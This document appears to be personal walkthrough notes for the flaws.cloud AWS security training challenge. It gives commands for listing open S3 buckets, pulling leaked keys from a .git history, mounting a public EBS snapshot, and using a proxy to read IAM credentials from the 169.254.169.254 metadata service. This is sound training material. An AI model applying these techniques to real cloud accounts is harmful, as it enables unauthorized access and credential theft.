# Flaws.cloud

- **Level 1**
	- When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud).
	-  S3 buckets are a global name space, meaning two people cannot have buckets with the same name.
	- you could create a bucket named apple.com and Apple would never be able host their main site via S3 hosting.
	- You can determine the site is hosted as an S3 bucket by running a DNS lookup on the domain,
	- `dig +nocmd domainname any +multiline +noall +answer`
	- Go to `A`  listed IP  in the browser it should redirect it to `https://aws.amazon.com/s3/`
	- It gives an indication that a bucket has been created by someone with the same name as the domain. 
	- `nslookup` on the `IP Address` will reveal the full domain address of the bucket.

	-  See `nslookup 54.231.184.255`
	- All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. In this case, flaws.cloud can also be visited by going to `http://flaws.cloud.s3-website-us-west-2.amazonaws.com/`
	-  Use `aws  cli` to interact with the bucket 
		-  `pip install was-cli`
	- Region is also important to supply in the command
	- `aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2`
	- If you happened to not know the region, there are only a dozen regions to try. You could also use the GUI tool cyberduck to browse this bucket and it will figure out the region automatically.
	- Note that according to the documentation there are only a limited number of regions. Hence bruteforcing this with the table below could work. Moreover, the command works in this case without specifying the region.
	- On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. A number of people accidentally open them up with permissions that are too loose. Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings.
	- By default, S3 buckets are private and secure when they are created. To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, which is fine if you plan to publicly host the bucket as a web page. But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions.
	- "Everyone" means everyone on the Internet. You can also list the files simply by going to http://flaws.cloud.s3.amazonaws.com/ due to that List permission.
	-  you can also just visit http://flaws.cloud.s3.amazonaws.com/ which lists the files due to the permissions issues on this bucket.

- **Level 2**
	- Create an IAM admin user 
	- `aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`
	- `aws s3 --profile Flawer ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`
	- http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
	- Similar to opening permissions to "Everyone", people accidentally open permissions to "Any Authenticated AWS User". They might mistakenly think this will only be users of their account, when in fact it means anyone that has an AWS account.

- **Level 3**
	- Found `.git` repository 
	- We can download the whole s3 bucket `aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2`
	- You can read the `git logs` 
		- `git logs`
	- Go back to the state
		- `git checkout commit_id` 
- **Level 4**
	- You can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but you'll need to find it.
   - To do this, first we need the account ID, which we can get using the AWS key from the previous level
		` aws --profile flaws sts get-caller-identity`
	- discover the snapshot
		`aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029  --region us-west-2` 

 - Now that you know the snapshot ID, you're going to want to mount it. You'll need to do this in your own AWS account, which you can get for free.
 - First, create a volume using the snapshot:
	
	` aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89`
 
 - **Level 5**
	 - Get the account ID
 	  
		`aws --profile flaws sts get-caller-identity`

	 - Find the snapshots from the User ID
	 
		`aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029 --region us-west-2`

 	 - Create the volume from the snapshot

		`aws --profile Flawer ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89` 

	 - make sure the region is right.

	 - mount the volume
 
		 - `lsblk`
		 - `sudo file -s /dev/xvdf1`
		 - `sudo mount /dev/xvdf1 /mnt`

 - **Level 6**
	 - Accessing it locally gives the meta data about instance
	 - The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. 
	 -  Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has no constraints. If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.
	 
	 - `curl http://169.254.169.254/latest/meta-data/`
	 - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/`
	 - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/secret-credentials/flaws`
	 - `http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`
 
 - **Level 7**
	 - 
